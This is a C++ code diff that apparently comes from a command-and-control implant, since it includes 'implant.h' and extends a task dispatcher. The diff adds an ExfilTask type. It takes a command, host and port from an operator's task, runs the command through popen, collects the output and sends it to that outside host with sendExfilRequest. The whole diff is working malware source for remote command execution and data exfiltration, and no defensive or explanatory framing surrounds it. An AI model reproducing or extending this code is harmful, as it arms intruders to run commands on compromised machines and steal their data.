@@ -1,4 +1,5 @@
 #include "tasks.h"
+#include "implant.h"
 
 #include <string>
 #include <array>
@@ -50,6 +51,15 @@
     }
 
     //ADD NEW TASKS HERE
+
+    if (taskType == ExfilTask::key) {
+    return ExfilTask{
+        id,
+        taskTree.get_child("command").get_value<std::string>(),
+        taskTree.get<std::string>("host"),
+        taskTree.get<std::string>("port")
+    };
+}
 
     throw std::logic_error("Illegal task type encountered: " + taskType);
 }
@@ -106,3 +116,33 @@ Result ExecuteTask::run() const {
         return Result{ id, e.what(), false };
     }
 }
+
+ExfilTask::ExfilTask(const boost::uuids::uuid& id,
+    std::string command,
+    std::string host,
+    std::string port)
+    : id{ id },
+      command{ std::move(command) },
+      host{ std::move(host) },
+      port{ std::move(port) } {}
+ 
+Result ExfilTask::run() const {
+    std::string output;
+    try {
+        std::array<char, 128> buffer{};
+        std::unique_ptr<FILE, decltype(&pclose)> pipe{
+            popen(command.c_str(), "r"), pclose
+        };
+        if (!pipe)
+            throw std::runtime_error("Failed to open pipe.");
+        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
+            output += buffer.data();
+    }
+    catch (const std::exception& e) {
+        return Result{ id, e.what(), false };
+    }
+ 
+    sendExfilRequest(host, port, command, output);
+    return Result{ id, "exfil sent", true };
+}
+ 
